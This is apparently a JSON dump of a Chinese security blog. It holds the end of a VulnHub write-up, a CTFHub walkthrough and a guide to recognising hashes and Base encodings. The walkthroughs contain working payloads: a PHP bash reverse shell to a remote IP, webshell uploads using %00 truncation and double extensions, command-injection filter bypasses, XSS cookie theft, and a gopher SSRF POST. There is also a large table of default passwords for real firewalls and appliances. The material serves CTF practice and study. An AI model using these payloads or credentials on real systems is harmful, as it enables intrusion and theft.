/dev/tcp/172.22.204.2/1234 0>&1&#x27;\"); ?>\n\n得到\nmessage=%3C%3Fphp%20exec(%22%2Fbin%2Fbash%20-c%20&#x27;bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F172.22.204.2%2F1234%200%3E%261&#x27;%22)%3B%20%3F%3E&file=hello.php\n\n\n\n访问hello.php文件\n\n拿到shell\n\nFLAG1到根目录\n\n\n\n\n\n\n\n\n\n\nFlag 1!\nYou’ve gotten onto the system.  Now why has Cypher locked everyone out of it?\nCan you find a way to get Cypher’s password? It seems like he gave it toAgent Smith, so Smith could figure out where to meet him.\nAlso, pull this image from the webserver on port 80 to get a flag.\n&#x2F;.cypher-neo.png\n标志1 !\n你已经进入系统了。为什么塞弗把所有人都锁在外面?\n你能想办法拿到塞弗的密码吗?看来他把它给了史密斯探员，这样史密斯就能找到和他见面的地方。\n另外，从端口80的web服务器上拉出这个图像来获得一个标志。&#x2F;.cypher-neo.png\n提示我们需要从网站上找到图片.cypher-neo.png，拿到其中的密码\n直接wget\n\nFLAG2\n","slug":"vulnhub","date":"2022-08-29T07:06:05.187Z","categories_index":"网络安全学习","tags_index":"靶场","author_index":"Ttoc"},{"id":"d58b830525b9df5a19c1d8f3036b3b91","title":"CTFHub-wp","content":"做做笔记\n\n\nWEB1.密码口令1）弱口令一般思维，\n用户名：admin，root\n密码：password，admin123，123456\n可以用top100字典（可以网上找一下）跑一下，但有的可能需要枚举法\n比如admin888或者admin255这样的类似的，就需要在后面用枚举法找出，字典并没包含这种类似情况\n2）默认口令就是系统默认的口令，在渗透测试过程中，最常见的情况就是遇到弱口令得到入口从而攻陷整个系统，由于很多系统管理员缺少安全意识，口令往往是系统默认设置的口令\n常见网络安全设备弱口令(默认口令)\n设备    默认账号    默认密码\n深信服产品    sangfor    sangfor sangfor@2018 sangfor@2019\n深信服科技 AD        dlanrecover\n深信服负载均衡 AD 3.6    admin    admin\n深信服WAC ( WNS V2.6)    admin    admin\n深信服VPN    Admin    Admin\n深信服ipsec-VPN (SSL 5.5)    Admin    Admin\n深信服AC6.0    admin    admin\nSANGFOR防火墙    admin    sangfor\n深信服AF(NGAF V2.2)    admin    sangfor\n深信服NGAF下一代应用防火墙(NGAF V4.3)    admin    admin\n深信服AD3.9    admin    admin\n深信服上网行为管理设备数据中心    Admin    密码为空\nSANGFOR_AD_v5.1    admin    admin\n网御漏洞扫描系统    leadsec    leadsec\n天阗入侵检测与管理系统 V7.0    Admin    venus70\nAudit    venus70\nadm    venus70\n天阗入侵检测与管理系统 V6.0    Admin    venus60\nAudit    venus60\nadm    venus60\n网御WAF集中控制中心(V3.0R5.0)    admin    leadsec.waf\naudit    leadsec.waf\nadm    leadsec.waf\n联想网御    administrator    administrator\n网御事件服务器    admin    admin123\n联想网御防火墙PowerV    administrator    administrator\n联想网御入侵检测系统    lenovo    default\n网络卫士入侵检测系统    admin    talent\n网御入侵检测系统V3.2.72.0    adm    leadsec32\nadmin    leadsec32\n联想网御入侵检测系统IDS    root    111111\nadmin    admin123\n科来网络回溯分析系统    csadmin    colasoft\n中控考勤机web3.0    administrator    123456\nH3C iMC    admin    admin\nH3C SecPath系列    admin    admin\nH3C S5120-SI    test    123\nH3C智能管理中心    admin    admin\nH3C ER3100    admin    adminer3100\nH3C ER3200    admin    adminer3200\nH3C ER3260    admin    adminer3260\nH3C    admin    adminer\nadmin    admin\nadmin    h3capadmin\nh3c    h3c\n360天擎    admin    admin\n网神防火墙    firewall    firewall\n天融信防火墙NGFW4000    superman    talent\n黑盾防火墙    admin    admin\nrule    abc123\naudit    abc123\n华为防火墙    telnetuser    telnetpwd\nftpuser    ftppwd\n方正防火墙    admin    admin\n飞塔防火墙    admin    密码为空\nJuniper_SSG__5防火墙    netscreen    netscreen\n中新金盾硬件防火墙    admin    123\nkill防火墙(冠群金辰)    admin    sys123\n天清汉马USG防火墙    admin    venus.fw\nAudit    venus.audit\nuseradmin    venus.user\n阿姆瑞特防火墙    admin    manager\n山石网科    hillstone    hillstone\n绿盟安全审计系统    weboper    weboper\nwebaudit    webaudit\nconadmin    conadmin\nadmin    admin\nshell    shell\n绿盟产品        nsfocus123\nTopAudit日志审计系统    superman    talent\nLogBase日志管理综合审计系统    admin    safetybase\n网神SecFox运维安全管理与审计系统    admin    !1fw@2soc#3vpn\n天融信数据库审计系统    superman    telent\nHillstone安全审计平台    hillstone    hillstone\n网康日志中心    ns25000    ns25000\n网络安全审计系统（中科新业）    admin    123456\n天玥网络安全审计系统    Admin    cyberaudit\n明御WEB应用防火墙    admin    admin\nadmin    adminadmin\n明御攻防实验室平台    root    123456\n明御安全网关    admin    adminadmin\n明御运维审计与册风险控制系统    admin    1q2w3e\nsystem    1q2w3e4r\nauditor    1q2w3e\noperator    1q2w3e4r\n明御网站卫士    sysmanager    sysmanager888\n亿邮邮件网关    eyouuser    eyou_admin\neyougw    admin@(eyou)\nadmin    +-ccccc\nadmin    cyouadmin\nWebsense邮件安全网关    administrator    admin\n梭子鱼邮件存储网关    admin    admin\n\n2.信息泄露-备份文件下载\n2.1 信息泄露-robots.txt访问url/robots.txt\n\n查看爬虫协议\n2.2 信息泄露-bak文件访问url/文件名.后缀名.bak\n\n下载bak（备份文件）\n2.3 信息泄露-vim缓存原理在使用vim时会创建临时缓存文件，关闭vim时缓存文件则会被删除，当vim异常退出后，因为未处理缓存文件，导致可以通过缓存文件恢复原始文件内容\n以 index.php 为例：第一次产生的交换文件名为 .index.php.swp\n再次意外退出后，将会产生名为 .index.php.swo 的交换文件\n第三次产生的交换文件则为 .index.php.swn作用\n可用来恢复意外退出的文件\n如何利用SWP文件为隐藏文件，操作时需要在文件名前加.\n针对SWP备份文件，我们可以使用vim -r filename命令来恢复文件(vim使用的缓存存储为一种固定格式的二进制文件。而我们一般编辑的时明问可见字符，在vim的缓存中这些可见字符会原样保留,所以显示是一种乱码)根据提示按回车进行恢复\n2.4 信息泄露-.DS_Store\n\n\n\n\n\n\n\n\n.DS_Store 是 Mac OS 保存文件夹的自定义属性的隐藏文件。通过.DS_Store可以知道这个目录里面所有文件的清单。\n访问url/.DS_Store\n\n下载DS_Store文件\n3.信息泄露-Git泄露-log 第一次使用githack，记录一下\n注意githack需要python2.7版本\n当前大量开发人员使用git进行版本控制，对站点自动部署。如果配置不当，可能会将.git文件夹直接部署到线上环境。这就引起了git泄露漏洞。\nGitHack是一个.git泄露利用测试脚本，通过泄露的文件，还原重建工程源代码。\n工作原理1、解析.git/index文件，找到工程中所有的： ( 文件名，文件sha1 )2、去.git/objects/ 文件夹下下载对应的文件3、zlib解压文件，按原始的目录结构写入源代码\n优点速度快，默认20个工作线程尽量还原所有的源代码，缺失的文件不影响脚本工作脚本不需要执行额外的git命令，all you need is python脚本无需浏览目录\n用法示例注意这里在url后面需要加上.git，用dirsearch可以扫出来（python3）\nGitHack.py http://www.openssl.org/.git/\n\n然后在目录dist就会生成对应目录 \n打开目录，输入cmd，执行git log【git log 可以查看commit history，也就是命令执行的历史，可以看看之前执行过哪些命令，方便后面查询命令执行的具体内容】\n\n然后复制add flag这个命令的代码，如上图75272ca078b7eedcf329a2b08f6e4faae0a36a99\n然后用git diff\n【\ngit diff比较两个版本的差异，\n这里后面只有一个命令就是比较本地工作区和缓存区的信息区别\n如果后面有两个命令，就是比较这两个命令的差别\n】\n\n这里比较，就得到了flag\n4.信息泄露-Git泄露-Stashgit stash 的作用git stash用于想要保存当前的修改,但是想回到之前最后一次提交的干净的工作仓库时进行的操作.git stash将本地的修改保存起来,并且将当前代码切换到HEAD提交上.\n通过git stash存储的修改列表,可以通过git stash list查看.git stash show用于校验,git stash apply用于重新存储.直接执行git stash等同于git stash save.\n最新的存储保存在refs/stash中老的存储可以通过相关的参数获得,例如stash@&#123;0&#125;获取最新的存储,stash@{1}获取次新.stash@&#123;2.hour.ago&#125;获取两小时之前的.存储可以直接通过索引的位置来获得stash@&#123;n&#125;.\n操作同2.log\n可以先用dirsearch扫一下， 发现refs/stash文件，\n然后用GitHack扫描\n在生成文件夹里有stash文件\n`D:\\GitHack-master\\dist\\challenge-8d48663e236c2ebc.sandbox.ctfhub.com_10800\\.git\\refs`\n\n\n打开看到\n\n在生成的文件夹下用\ngit diff d8c1978b1e71300574e1bb5335a01124b3a55569\n\n得到flag\n【也可以使用 git bash，直接在生成的文件夹下\n执行git stash list \n查看stash了哪些存储\n\n然后执行git stash pop\n恢复之前缓存的工作目录，将缓存堆栈中的对应stash删除，\n并将对应修改应用到当前的工作目录下,默认为第一个stash,即stash@&#123;0&#125;，\n\n如果要应用并删除其他stash，命令：git stash pop stash@&#123;$num&#125; ，\n比如应用并删除第二个：git stash pop stash@&#123;1&#125;）\n\n然后会在该目录下生成一个新的txt文件，打开或用cat命令，得到flag\n】\n5.信息泄露-SVN泄露当开发人员使用 SVN 进行版本控制，对站点自动部署。如果配置不当,可能会将.svn文件夹直接部署到线上环境。这就引起了 SVN 泄露漏洞。\n这道题需要运用dvcs-ripper工具进行处理\n可以先用dirsearch扫出.svn目录，说明有SVN泄露\n和githack类似，\n./rip-svn.pl -v -u url/.svn\n\n然后在dvcs-ripper目录里，进入.svn目录\n\n然后进入pristine目录，进去发现两个目录，挨个打开\n\n\n发现一个目录下是网站页面源码，另一个就是flag\n得到flag\n6.信息泄露-HG泄露`当开发人员使用 Mercurial 进行版本控制，对站点自动部署。如果配置不当,可能会将.hg 文件夹直接部署到线上环境。这就引起了 hg 泄露漏洞。`\n\n可以先用dirsearch扫出.hg目录，说明有HG泄露\n这个和SVN一样，只不过要改成.hg\n./rip-hg.pl -v -u url/.hg\n\n\n发现两个文件，猜测为HG泄露文件\n\n发现flag文本文件\n\nurl+flag_973127138.txt\n得到flag\n7.xss-xss反射型发现它有两个输入框\n\n第一个输入测试语句，成功弹窗\n第二个是发送url，盲猜是发到后台\n看了一些wp，发现需要使用xss测试平台http://xsscom.com//index.php\n先创建项目\n\n设置配置\n\n然后点击查看代码\n\n在最下面看到\n\n把代码\n&#x27;\">\n\n输入到第一个框中\n再把提交后的url复制，然后到第二框中发送\n\n然后返回xss测试平台上查看\n\ncookie处出现flag\n8.文件上传-文件头检查文件头是直接位于文件中的一段数据,是文件的一部分\n这里过滤文件头，而且限制图片类型文件，所以可以试试上传一个没有任何问题的图片【注意图片不能太大，不然会最后用蚁剑连接会爆错，我上传1mb大小图片就报错，最后上传400字节图片才成功】\n\n上传图片后，在后面加上一句话木马，并修改文件名\n【也可以用cmd 合成图片马，也是有图片文件头】\n\n【copy 图片名.png(.jpg)/b + 木马文件名.php(.asp/.aspx)/a 生成图片名.png(.jpg)】\n\n【已试可行】\n\n\n然后正常用蚁剑连接\n\n得到flag\n9.文件上传-00截断0x00截断原理：[php&lt;5.3.29]0x00是十六进制表示方法，是ascii码为0的字符，在有些函数处理时，会把这个字符当做结束符。系统在对文件名的读取时，如果遇到0x00，就会认为读取已结束。这个可以用在对文件类型名的绕过上。\n\n但要注意是文件的16进制内容里的00，而不是文件名中的00 ！！！就是说系统是按16进制读取文件（或者说二进制），\n\n遇到ascii码为零的位置就停止，而这个ascii码为零的位置在16进制中是00，用0x开头表示16进制，也就是所说的0x00截断。\n\n%00是被服务器解码为0x00发挥了截断作用。\n\n举个例子，url中输入的是upload/post.php%00.png，看样子是图片文件，那么后台读取到是upload/post.php，就实现了绕后目的。\n我们开始先上传一个文件试试，限制jpg,png,gif后缀\n上传成功后，没有显示上传路径，只是url变化\nhttp://challenge-6cc6a23c8f284d6b.sandbox.ctfhub.com:10800/?road=/var/www/html\n 猜想多半重新临时文件名，不固定，导致显示不了路径\n这里就需要00截断，要把文件上传的路径，找到，好用蚁剑连接\n先要清楚%00截断点在哪里，我们先F12看\n看网站源码\n&lt;!DOCTYPE &lt;!DOCTYPE html>\nhtml>\n\nhead>\n    meta charset=\"UTF-8\">\n    title>CTFHub 文件上传 - 00截断title>\nhead>\n\nbody>\n    h1>CTFHub 文件上传 - 00截断h1>\n    form action=?road=/var/www/html/upload/ method=\"post\" enctype=\"multipart/form-data\">\n        label for=\"file\">Filename:label>\n        input type=\"file\" name=\"file\" id=\"file\" />\n        br />\n        input type=\"submit\" name=\"submit\" value=\"Submit\" />\n    form>\n\nif (!empty($_POST[&#x27;submit&#x27;])) &#123;\n    $name = basename($_FILES[&#x27;file&#x27;][&#x27;name&#x27;]);\n    $info = pathinfo($name);\n    $ext = $info[&#x27;extension&#x27;];\n    $whitelist = array(\"jpg\", \"png\", \"gif\");\n    if (in_array($ext, $whitelist)) &#123;\n        $des = $_GET[&#x27;road&#x27;] . \"/\" . rand(10, 99) . date(\"YmdHis\") . \".\" . $ext;\n        if (move_uploaded_file($_FILES[&#x27;file&#x27;][&#x27;tmp_name&#x27;], $des)) &#123;\n            echo \"alert(&#x27;上传成功&#x27;)\";\n        &#125; else &#123;\n            echo \"alert(&#x27;上传失败&#x27;)\";\n        &#125;\n    &#125; else &#123;\n        echo \"文件类型不匹配\";\n    &#125;\n&#125;\n-->\nbody>\n\nhtml>\n\n发现里面有一串代码\nif (!empty($_POST[&#x27;submit&#x27;])) &#123;\n    $name = basename($_FILES[&#x27;file&#x27;][&#x27;name&#x27;]);\n    $info = pathinfo($name);\n    $ext = $info[&#x27;extension&#x27;];\n    $whitelist = array(\"jpg\", \"png\", \"gif\");\n    if (in_array($ext, $whitelist)) &#123;\n        $des = $_GET[&#x27;road&#x27;] . \"/\" . rand(10, 99) . date(\"YmdHis\") . \".\" . $ext;\n        if (move_uploaded_file($_FILES[&#x27;file&#x27;][&#x27;tmp_name&#x27;], $des)) &#123;\n            echo \"alert(&#x27;上传成功&#x27;)\";\n        &#125; else &#123;\n            echo \"alert(&#x27;上传失败&#x27;)\";\n        &#125;\n    &#125; else &#123;\n        echo \"文件类型不匹配\";\n    &#125;\n&#125;\n-->\n\nmove_uploaded_file($_FILES[&#39;file&#39;][&#39;tmp_name&#39;],$des)这个函数就是把上传文件放到$des的路径上并且改了文件名\n所以我们不能让后面的rand()和date()运行，所以对于变量road【也就是开始讲到的】，就需要在它后面加上一个%00截断后面的语句\n也就是下面这个请求头后面\n\n图片正常上传就可以，这就是把图片内容上传到1.php文件中，这样虽然我们上传的是一个图片，但实际上，我们上传了一个名为1.php的一句话木马\n【名字不重要，虽然图片和php文件名一样，这里1.php是随便取得，主要蚁剑连接的就是它】\n\n用蚁剑连接url/upload/1.php\n得到flag\n10.文件上传-双写后缀进行了一次过滤php后缀名，双写php为pphphp，这样当过滤了__的php，剩下的仍然是php，正常用蚁剑连接\n\n\n得到flag\n11.RCE-命令注入-综合训练\n\n$res = FALSE;\n\nif (isset($_GET[&#x27;ip&#x27;]) && $_GET[&#x27;ip&#x27;]) &#123;\n    $ip = $_GET[&#x27;ip&#x27;];\n    $m = [];\n    if (!preg_match_all(\"/(\\||&|;| |\\/|cat|flag|ctfhub)/\", $ip, $m)) &#123;\n        $cmd = \"ping -c 4 &#123;$ip&#125;\";\n        exec($cmd, $res);\n    &#125; else &#123;\n        $res = $m;\n    &#125;\n&#125;\n?>\n\n这道题\n看到|，;，&amp;都被过滤了\n那么可以用%0a也是换行符代替\n空格，&#x2F;，cat，flag，ctfhub（这些好像不大用的上，没关系）\n$IFS代替空格，cat可以用more代替，%09代替TAB键，用来补全flag\n?ip=120.0.0.1%0als\n\n然后\n?ip=120.0.0.1%0acd$IFS%09*_is_here%0als\n\n后面就简单了\n?ip=120.0.0.1%0acd$IFS%09*_is_here%0amore$IFS%09*24135173615424.php\n右键查看源码\n得到flag\n12.SSRF-内网访问\n\n所以构造payload\nhttp://challenge-c0c40a8ea91b3909.sandbox.ctfhub.com:10800/?url=127.0.0.1/flag.php\n得到flag\n13.SSRF-伪协议读取文件伪协议事实上是其支持的协议与封装协议。而其支持的部分协议有：\n    file:// — 访问本地文件系统\n\n    http:// — 访问 HTTP(s) 网址\n\n    ftp:// — 访问 FTP(s) URLs\n\n    php:// — 访问各个输入/输出流(I/O streams)\n\n根据提示，flag在Web目录下，Web目录一般是在/var/www/html/下\nhttp://challenge-5c45d983b45e22b7.sandbox.ctfhub.com:10800/?url=file:///var/www/html/flag.php\n得到flag\n14.SSRF-端口扫描端口扫描，那就利用爆破，从8000到9000扫一遍，看看flag在哪个端口下\nhttp://challenge-30d6aa92f511ee1f.sandbox.ctfhub.com:10800/?url=127.0.0.1:8000\n\n看到长度不同，打开查看响应数据包\n得到flag\n15.SSRF-POST请求hint：这次是发一个HTTP POST请求.对了.ssrf是用php的curl实现的.并且会跟踪302跳转.加油吧骚年\n开始是一个空白页面\n网站为\nhttp://challenge-177dcd6de76352cb.sandbox.ctfhub.com:10800/?url=_\n\n我们在其后面加上127.0.0.1/flag.php看看能不能直接访问该文件\nhttp://challenge-177dcd6de76352cb.sandbox.ctfhub.com:10800/?url=127.0.0.1/flag.php\n\n\n发现出现了一个输入框\nF12查看源码：\n&lt;form action=&quot;/flag.php&quot; method=&lt;form action=&quot;/flag.php&quot; method=\"post\">\n\tinput type=\"text\" name=\"key\">\n\tbug: key=11e053e2b7900523ac51fc7606b964e2-->\nform>\n\n发现了一个key的参数\nkey=11e053e2b7900523ac51fc7606b964e2\n//key是不定的哈，不要全copy\n\n我们把key值输入框中试试\n\n看来只能从本地127.0.0.1访问\n利用file://伪协议从本地方式访问文件看看index.php文件\nhttp://challenge-177dcd6de76352cb.sandbox.ctfhub.com:10800/?url=file:///var/www/html/index.php\n\n右键查看，\n得到index.php源码\n  \n\nerror_reporting(0);\n\nif (!isset($_REQUEST[&#x27;url&#x27;]))&#123;\n    header(\"Location: /?url=_\");\n    exit;\n&#125;\n\n$ch = curl_init();\ncurl_setopt($ch, CURLOPT_URL, $_REQUEST[&#x27;url&#x27;]);\ncurl_setopt($ch, CURLOPT_HEADER, 0);\ncurl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);\ncurl_exec($ch);\ncurl_close($ch);\n\n以相同方式看看flag.php文件\n\n\n\n\n-->\n\n\n根据flag.php最后的提示，\n尝试 Gopher 协议向服务器发送 POST 包\nGopher协议的格式:\n\ngopher://IP:port/_TCP/IP数据流\n\n先构造 Gopher协议所需的 POST请求：\nPOST /flag.php HTTP/1.1\nHost: 127.0.0.1:80\nContent-Length: 36          \nContent-Type: application/x-www-form-urlencoded\n\nkey=11e053e2b7900523ac51fc7606b964e2\n\n//Content-Length 这个要和底下POST参数[包括key=,4个]长度一致\n\n但是这里需要对其进行两次url编码\n根据hint，请求有curl功能\n在向服务器发送请求时，首先浏览器会进行一次 URL解码，\n其次服务器收到请求后，在执行curl功能时，进行第二次 URL解码\n因此需要两次url编码\n`注`：\n在第一次编码后的数据中，将`%0A`全部替换为`%0D%0A`。\n\n因为 Gopher协议包含的请求数据包中，可能包含有`=`、`&`等特殊字符，\n避免与服务器解析传入的参数键值对混淆，所以对数据包进行 URL编码，这样服务端会把`%`后的字节当做普通字节。\n\n\n然后第二次编码\n\n得到\nPOST%2520%252Fflag.php%2520HTTP%252F1.1%250D%250AHost%253A%2520127.0.0.1%253A80%250D%250AContent-Length%253A%252036%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%250D%250AContent-Type%253A%2520application%252Fx-www-form-urlencoded%250D%250A%250D%250Akey%253D11e053e2b7900523ac51fc7606b964e2\n\n然后又因为flag.php里有$_SERVER[&quot;REMOTE_ADDR&quot;]\nif ($_SERVER[&quot;REMOTE_ADDR&quot;] != if ($_SERVER[&quot;REMOTE_ADDR&quot;] != \"127.0.0.1\") &#123;\n    echo \"Just View From 127.0.0.1\";\n    return;\n&#125;\n\n如果直接在输入框，上传POST请求又会显示\n\n这个想绕过，就只有通过index.php的curl功能，利用Gopher协议从127.0.0.1向目标发送POST请求\n?url=gopher://127.0.0.1:80/_POST%2520%252Fflag.php%2520HTTP%252F1.1%250D%250AHost%253A%2520127.0.0.1%253A80%250D%250AContent-Length%253A%252036%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%250D%250AContent-Type%253A%2520application%252Fx-www-form-urlencoded%250D%250A%250D%250Akey%253D11e053e2b7900523ac51fc7606b964e2\n\n\n得到flag\n","slug":"wp-CTFHub","date":"2022-07-27T09:31:30.845Z","categories_index":"网络安全学习","tags_index":"靶场","author_index":"Ttoc"},{"id":"925fed3a18c07a3de0254ce9178a9827","title":"加密密文特征","content":"原文链接\n\n\n1、MD5——示例21232F297A57A5A743894A0E4A801FC3\n一般MD5值是32位由数字0-9和字母a-f所组成的字符串，如图。如果出现这个范围以外的字符说明这可能是个错误的md5值，就没必要再拿去解密了。16位值是取的是8~24位。\n\nmd5的三个特征：\n1.确定性：一个原始数据的MD5值是唯一的，同一个原始数据不可能会计算出多个不同的MD5值。\n2.碰撞性：原始数据与其MD5值并不是一一对应的，有可能多个原始数据计算出来的MD5值是一样的，这就是碰撞。\n3.不可逆：也就是说如果告诉你一个MD5值，你是无法通过它还原出它的原始数据的，这不是你的技术不够牛，这是由它的算法所决定的。因为根据第2点，一个给定的MD5值是可能对应多个原始数据的，并且理论上讲是可以对应无限多个原始数据，所有无法确定到底是由哪个原始数据产生的。\n2、sha1——示例d033e22ae348aeb5660fc2140aec35850c4da997\n这种加密的密文特征跟MD5差不多，只不过位数是40\n\n3、HMAC算法——示例5b696ae7da9442ead7adc24d03cedb65\nHMAC (Hash-based Message Authentication Code) 常用于接口签名验证，这种算法就是在前两种加密的基础上引入了秘钥，而秘钥又只有传输双方才知道，所以基本上是破解不了的\n\n4、NTLM——示例209c6174da490caeb422f3fa5a7ae634\n这种加密是Windows的哈希密码，是 Windows NT 早期版本的标准安全协议。与它相同的还有Domain Cached Credentials（域哈希）。\n\n相似加密类型\n#    算法       长度\n\n1 \tmd5 \t 32/16\n2 \tsha1 \t    40\n3 \tsha256 \t    64\n4 \tsha512 \t   128\n5 \tadler32 \t 8\n6 \tcrc32 \t     8\n7 \tcrc32b       8\n8 \tfnv132 \t     8\n9 \tfnv164 \t    16\n10 \tfnv1a32 \t 8\n11 \tfnv1a64     16\n12 \tgost \t    64\n13 \tgost-crypto 64\n14 \thaval128,3 \t32\n15 \thaval128,4 \t32\n16 \thaval128,5 \t32\n17 \thaval160,3 \t40\n18 \thaval160,4 \t40\n19 \thaval160,5 \t40\n20 \thaval192,3 \t48\n21 \thaval192,4 \t48\n22 \thaval192,5 \t48\n23 \thaval224,3 \t56\n24 \thaval224,4 \t56\n25 \thaval224,5 \t56\n26 \thaval256,3 \t64\n27 \thaval256,4 \t64\n28 \thaval256,5 \t64\n29 \tjoaat \t     8\n30 \tmd2          32\n31 \tmd4 \t     32\n32 \tripemd128 \t 32\n33 \tripemd160 \t 40\n34 \tripemd256 \t 64\n35 \tripemd320 \t 80\n36 \tsha224 \t     56\n37 \tsha3-224 \t 56\n38 \tsha3-256 \t 64\n39 \tsha3-384 \t 96\n40 \tsha3-512 \t 128\n41 \tsha384       96\n42 \tsha512/224   56\n43 \tsha512/256 \t 64\n44 \tsnefru       64\n45 \tsnefru256    64\n46 \ttiger128,3 \t 32\n47 \ttiger128,4 \t 32\n48 \ttiger160,3   40\n49 \ttiger160,4   40\n50 \ttiger192,3 \t 48\n51 \ttiger192,4   48\n52 \twhirlpool \t 128\n53 \tmysql \t     老MYSQL数据库用的，16位，且第1位和第7位必须为0-8\n54 \tmysql5 \t     40\n55 \tNTLM \t     32\n56 \tDomain Cached Credentials \t32\n\n常用解密网站：www.cmd5.com（带批量解密工具）\nwww.somd5.com\ncmd5.la\npmd5.com\nwww.ttmd5.com（带批量解密工具）\n\nBase64、Base58、Base32、Base16、Base85、Base100等相似加密类型\n1、Base64——示例YWRtaW4tcm9vdA&#x3D;&#x3D;\n一般情况下密文尾部都会有两个等号，明文很少的时候则没有\nBase64编码要求把3个8位字节（38&#x3D;24）转化为4个6位的字节（46&#x3D;24），之后在6位的前面补两个0，形成8位一个字节的形式。如果剩下的字符不足3个字节，则用0填充，输出字符使用‘&#x3D;’，因此编码后输出的文本末尾可能会出现1或2个‘&#x3D;’，如图。\n\n为了保证所输出的编码位可读字符，Base64制定了一个编码表，以便进行统一转换。编码表的大小为2^6&#x3D;64，这也是Base64名称的由来。\n\nBase64使用注意问题一、Base64和URL传参问题标准的Base64并不适合直接放在URL里传输，因为URL编码器会把标准Base64中的“&#x2F;”和“+”字符变为形如“%XX”的形式，而这些“%”号在存入数据库时还需要再进行转换，因为ANSI SQL中已将“%”号用作通配符。\n为解决此问题，可采用一种用于URL的改进Base64编码，它在末尾填充’&#x3D;’号，并将标准Base64中的“+”和“&#x2F;”分别改成了“-”和“_”，这样就免去了在URL编解码和数据库存储时所要作的转换，避免了编码信息长度在此过程中的增加，并统一了数据库、表单等处对象标识符的格式。\n二、Base64和URL传参问题改善另有一种用于正则表达式的改进Base64变种，它将“+”和“&#x2F;”改成了“!”和“-”，因为“+”,“*”以及前面在IRCu中用到的“[”和“]”在正则表达式中都可能具有特殊含义。\n此外还有一些变种，它们将“+&#x2F;”改为“-”或“.”（用作编程语言中的标识符名称）或“.-”（用于XML中的Nmtoken）甚至“_:”（用于XML中的Name）。\n三、Base64转换后比原有的字符串长1&#x2F;3Base64要求把每三个8Bit的字节转换为四个6Bit的字节（38 &#x3D; 46 &#x3D; 24），然后把6Bit再添两位高位0，组成四个8Bit的字节，也就是说，转换后的字符串理论上将要比原来的长1&#x2F;3。四、Base64转换总结\nBase64转换，最好是不要用在加密上，尤其是参数加密，很容易出问题。\n2、Base58——示例6tmHCZvhgfNjQu\n它最大的特点是没有等号\nBase58是用于比特币（Bitcoin）中使用的一种独特的编码方式，主要用于产生Bitcoin的钱包地址。\n相比Base64，Base58不使用数字”0”，字母大写”O”，字母大写”I”，和字母小写”l”，以及”+“和”&#x2F;“符号。\n比特币的Base58字母表：\n123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz\n简单的说：Base58一种编码方式，跟十进制，十六进制一样，不过更短更省空间。\nBase58的原理是什么？\n二进制：0和1\n十进制：1到10\n十六进制：十进制的基础上加上了A-F 六个字母\nBase58可以理解为一种58进制。\nBase58包含了阿拉伯数字、小写英文字母，大写英文字母。\n但是去掉了一些容易混淆的数字和字母：0（数字0）、O（o的大写字母）、l（ L的小写字母）、I（i的大写字母）\n\n3、Base32——示例GEZDGNBVGY3TQOJQGE&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;\n他的特点是明文超过十个后面就会有很多等号\nBase32使用了ASCII编码中可打印的32个字符(大写字母A-Z和数字2-7)对任意字节数据进行编码.Base32将串起来的二进制数据按照5个二进制位分为一组，由于传输数据的单位是字节(即8个二进制位).所以分割之前的二进制位数是40的倍数(40是5和8的最小公倍数).如果不足40位，则在编码后数据补充”&#x3D;”，一个”&#x3D;”相当于一个组(5个二进制位)，编码后的数据是原先的8&#x2F;5倍.\n\nBase32将任意字符串按照字节进行切分，并将每个字节对应的二进制值（不足8比特高位补0）串联起来，按照5比特一组进行切分，并将每组二进制值转换成十进制来对应32个可打印字符中的一个。\n\n由于数据的二进制传输是按照8比特一组进行（即一个字节），因此Base32按5比特切分的二进制数据必须是40比特的倍数（5和8的最小公倍数）。例如输入单字节字符“%”，它对应的二进制值是“100101”，前面补两个0变成“00100101”（二进制值不足8比特的都要在高位加0直到8比特），从左侧开始按照5比特切分成两组：“00100”和“101”，后一组不足5比特，则在末尾填充0直到5比特，变成“00100”和“10100”，这两组二进制数分别转换成十进制数，通过上述表格即可找到其对应的可打印字符“E”和“U”，但是这里只用到两组共10比特，还差30比特达到40比特，按照5比特一组还需6组，则在末尾填充6个“&#x3D;”。填充“&#x3D;”符号的作用是方便一些程序的标准化运行，大多数情况下不添加也无关紧要，而且，在URL中使用时必须去掉“&#x3D;”符号。\n与Base64相比，Base32具有许多优点：\n1.适合不区分大小写的文件系统，更利于人类口语交流或记忆。\n2.结果可以用作文件名，因为它不包含路径分隔符 “&#x2F;”等符号。\n3.排除了视觉上容易混淆的字符，因此可以准确的人工录入。（例如，RFC4648符号集忽略了数字“1”、“8”和“0”，因为它们可能与字母“I”，“B”和“O”混淆）。\n4.排除填充符号“&#x3D;”的结果可以包含在URL中，而不编码任何字符。\nBase32也比Base16有优势：\n·Base32比Base16占用的空间更小。（1000比特数据Base32需要200个字符，而Base16则为250个字符）\nBase32的缺点：\n·Base32比Base64多占用大约20％的空间。因为Base32使用8个ASCII字符去编码原数据中的5个字节数据，而Base64是使用4个ASCII字符去编码原数据中的3个字节数据。\n4、Base16——示例61646D696E\n它的特点是没有等号并且数字要多于字母\nBase16编码的方式：\n1.将数据(根据ASCII编码，UTF-8编码等)转成对应的二进制数，不足8比特位高位补0。然后将所有的二进制全部串起来，4个二进制位为一组，转化成对应十进制数。\n2.根据十进制数值找到Base16编码表里面对应的字符。Base16是4个比特位表示一个字符，所以原始是1个字节(8个比特位)刚好可以分成两组,也就是说原先如果使用ASCII编码后的一个字符，现在转化成两个字符。数据量是原先的2倍。\n\nBase16编码是一个标准的十六进制字符串（注意是字符串而不是数值），更易被人类和计算机使用，因为它并不包含任何控制字符，以及Base64和Base32中的“&#x3D;”符号。\n\n5、Base85——示例@:X4hDWe0rkE(G[OdP4CT]N#\n特点是奇怪的字符比较多，但是很难出现等号\n\n6、Base100——示例????????????????????\n特点就是一堆Emoji表情\nBase100编码&#x2F;解码工具（又名：Emoji表情符号编码&#x2F;解码），可将文本内容编码为Emoji表情符号；同时也可以将编码后的Emoji表情符号内容解码为文本。\n\n常用解密网站：Base64：\ntool.oschina.net\nwww.sojson.com\nbase64.us\nBase58：\nwww.metools.info\nBase32、16：\nwww.qqxiuzi.cn\nBase100：\nwww.atoolbox.net\n\n1、Unicode——汉字示例汉字示例&#36825（这）;、字母示例&#116（t）;、数字符号示例&#53（5）;\n\n可以说Unicode与HTML实体编码是一